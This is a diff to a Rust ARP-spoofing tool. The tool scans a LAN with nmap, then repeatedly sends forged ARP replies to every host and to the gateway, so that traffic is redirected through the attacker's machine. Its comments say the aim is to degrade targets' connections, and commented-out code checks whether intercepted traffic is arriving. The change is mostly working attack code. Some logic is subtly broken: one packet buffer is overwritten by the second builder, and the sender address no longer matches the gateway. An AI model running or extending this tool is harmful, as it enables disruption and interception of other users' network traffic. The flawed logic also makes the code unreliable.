@@ -4,11 +4,11 @@ use pnet::packet::MutablePacket;
 use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, MutableArpPacket};
 use pnet::packet::ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket};
 use pnet::util::MacAddr;
-use std::hint::spin_loop;
+use std::arch::x86_64::_mm_pause;
 use std::io::Write;
 use std::net::{IpAddr, Ipv4Addr};
 use std::process::Command;
-use std::time::Duration;
+use std::time::{Duration, Instant};
 
 use libc::{CPU_SET, CPU_ZERO, cpu_set_t, sched_setaffinity};
 use std::sync::{LazyLock, OnceLock};
@@ -18,8 +18,8 @@ use std::{io, mem};
 #[derive(Parser, Clone)]
 #[command(version, about, long_about = None)]
 pub struct Args {
-    /// In microsecond, default to 200 enough to make target stuttering (high ping)
-    #[arg(short, long, default_value_t = 200)]
+    /// In millisecond, default to 1000 (1sec) enough to make target stuttering (high ping)
+    #[arg(short, long, default_value_t = 1000)]
     pub sleep: u64,
     /// Thread N will be pinned
     #[arg(short, long, default_value_t = 1)]
@@ -78,6 +78,7 @@ fn get_active_interface(interfaces: &[NetworkInterface]) -> Option<&NetworkInter
     })
 }
 
+#[inline(always)]
 fn get_all_ips() -> Vec<Ipv4Addr> {
     let args = &*ARGS;
     let output = Command::new("nmap")
@@ -94,12 +95,14 @@ fn get_all_ips() -> Vec<Ipv4Addr> {
         .collect()
 }
 
+#[inline(always)]
 fn network_interface() -> NetworkInterface {
     let interfaces = interfaces();
     let active_interface = get_active_interface(&interfaces).unwrap();
     active_interface.clone()
 }
 
+#[inline(always)]
 fn scan_device() -> (Ipv4Addr, MacAddr) {
     let source_ip = NETWORK_INTERFACE
         .ips
@@ -116,6 +119,7 @@ fn scan_device() -> (Ipv4Addr, MacAddr) {
     (source_ip, source_mac)
 }
 
+#[inline]
 fn set_affinity_core(core_id: usize) -> Result<(), i32> {
     unsafe {
         let mut cpuset: cpu_set_t = mem::zeroed();
@@ -145,24 +149,55 @@ fn send_l2_packets() {
 
         let selves = &*SELF_INFO;
         let nf = &*NETWORK_INTERFACE;
+        let args = &*ARGS;
+
+        // use `mut rx` instead of `_rx` if you want listen datalink too
+        // need to import `Packet` from `pnet::packet` and also need to import `Ipv4Packet` from `pnet::packet::ipv4`
+
+        // uncomment this code ↓
+        // use pnet::packet::{Packet, ipv4::Ipv4Packet};
         let (mut tx, _rx) = match datalink::channel(nf, config) {
             Ok(datalink::Channel::Ethernet(tx, rx)) => (tx, rx),
             Ok(_) => panic!("Unhandled channel type"),
             Err(e) => panic!("Failed to create datalink channel: {}", e),
         };
+        let gateway = args.gateway.parse::<Ipv4Addr>().unwrap();
 
-        set_affinity_core(ARGS.thread as usize).unwrap();
-        spin_loop();
+        set_affinity_core(args.thread as usize).unwrap();
+
+        let mut last_poison = Instant::now();
+        let poison_interval = Duration::from_millis(args.sleep);
+
+        let all_ips = ALL_IPS.get().filter(|x| !x.contains(&selves.0)).unwrap();
 
         loop {
-            for target_ip in ALL_IPS.get().unwrap() {
-                if *target_ip != selves.0 {
-                    send_arp_packet(&mut *tx, nf, target_ip);
+            if last_poison.elapsed() >= poison_interval {
+                for target_ip in all_ips {
+                    send_arp_packet(&mut *tx, nf, target_ip, &gateway);
                 }
+                last_poison = Instant::now();
             }
-            if !ARGS.no_sleep {
-                sleep(Duration::from_micros(ARGS.sleep));
-            }
+            // to check if this spoofing is work or not
+            // match rx.next() {
+            //     Ok(packet) => {
+            //         if let Some(ethernet) = EthernetPacket::new(packet) {
+            //             // Only care about IPv4 traffic
+            //             if ethernet.get_ethertype() == EtherTypes::Ipv4
+            //                 && let Some(ipv4) = Ipv4Packet::new(ethernet.payload())
+            //             {
+            //                 let src = ipv4.get_source();
+            //                 let dst = ipv4.get_destination();
+            //                 if all_ips.contains(&src) && dst == selves.0
+            //                     || all_ips.contains(&dst) && src == selves.0
+            //                 {
+            //                     println!("Caught traffic: {} -> {}", src, dst);
+            //                 }
+            //             }
+            //         }
+            //     }
+            //     Err(e) => panic!("Error receiving packet: {}", e),
+            // }
+            _mm_pause();
         }
     });
 
@@ -178,6 +213,7 @@ fn send_l2_packets() {
             sleep(Duration::from_millis(500));
         }
         println!();
+        _mm_pause();
     }
 
     match handle.join() {
@@ -193,13 +229,15 @@ fn send_l2_packets() {
     }
 }
 
+#[inline]
 fn send_arp_packet(
     tx: &mut dyn pnet::datalink::DataLinkSender,
     interface: &NetworkInterface,
     target_ip: &Ipv4Addr,
+    gateway_ip: &Ipv4Addr,
 ) {
     let source_mac = interface.mac.unwrap_or_else(|| {
-        println!("Interface has no MAC address");
+        eprintln!("Interface has no MAC address use default 00:00:00:00:00:00");
         MacAddr::new(0, 0, 0, 0, 0, 0)
     });
 
@@ -213,18 +251,23 @@ fn send_arp_packet(
                 None
             }
         })
-        .unwrap_or_else(|| Ipv4Addr::new(192, 168, 1, 100));
+        .unwrap_or_else(|| {
+            eprintln!("Interface has ipv4 address use default 192.168.1.100");
+            Ipv4Addr::new(192, 168, 1, 100)
+        });
 
     let ethernet_size = EthernetPacket::minimum_packet_size();
     let arp_size = MutableArpPacket::minimum_packet_size();
     let total_size = ethernet_size + arp_size;
 
     tx.build_and_send(1, total_size, &mut |packet| {
-        build_arp_spoof(packet, source_mac, target_ip, source_ip)
+        build_arp_spoof(packet, source_mac, target_ip, source_ip);
+        build_arp_spoof_for_gateway(packet, source_mac, target_ip, gateway_ip);
     });
 }
 
-fn build_arp_spoof(packet: &mut [u8], my_mac: MacAddr, target_ip: &Ipv4Addr, gateway_ip: Ipv4Addr) {
+#[inline]
+fn build_arp_spoof(packet: &mut [u8], my_mac: MacAddr, target_ip: &Ipv4Addr, my_ip: Ipv4Addr) {
     let mut ethernet_packet = MutableEthernetPacket::new(packet).unwrap();
 
     // Send directly to the target's MAC (if known) or broadcast
@@ -243,9 +286,40 @@ fn build_arp_spoof(packet: &mut [u8], my_mac: MacAddr, target_ip: &Ipv4Addr, gat
 
     // Sender: You (claiming to be the Gateway)
     arp_packet.set_sender_hw_addr(my_mac);
-    arp_packet.set_sender_proto_addr(gateway_ip); // Pretending to be the router
+    arp_packet.set_sender_proto_addr(my_ip); // Pretending to be the router
 
     // Target: The victim device
     arp_packet.set_target_hw_addr(MacAddr::new(0, 0, 0, 0, 0, 0)); // Usually ignored in unsolicited replies
     arp_packet.set_target_proto_addr(*target_ip);
+}
+
+#[inline]
+fn build_arp_spoof_for_gateway(
+    packet: &mut [u8],
+    my_mac: MacAddr,
+    victim_ip: &Ipv4Addr, // whose identity we're stealing (in the gateway's eyes)
+    gateway_ip: &Ipv4Addr, // the device we're deceiving
+) {
+    let mut ethernet_packet = MutableEthernetPacket::new(packet).unwrap();
+
+    // Broadcast (or set to the gateway's MAC if known)
+    ethernet_packet.set_destination(MacAddr::broadcast());
+    ethernet_packet.set_source(my_mac);
+    ethernet_packet.set_ethertype(EtherTypes::Arp);
+
+    let mut arp_packet = MutableArpPacket::new(ethernet_packet.payload_mut()).unwrap();
+    arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
+    arp_packet.set_protocol_type(EtherTypes::Ipv4);
+    arp_packet.set_hw_addr_len(6);
+    arp_packet.set_proto_addr_len(4);
+
+    arp_packet.set_operation(ArpOperations::Reply);
+
+    // Sender: You, claiming to be the VICTIM
+    arp_packet.set_sender_hw_addr(my_mac);
+    arp_packet.set_sender_proto_addr(*victim_ip);
+
+    // Target: the GATEWAY (the one being poisoned)
+    arp_packet.set_target_hw_addr(MacAddr::new(0, 0, 0, 0, 0, 0)); // ignored in unsolicited replies
+    arp_packet.set_target_proto_addr(*gateway_ip);
 }
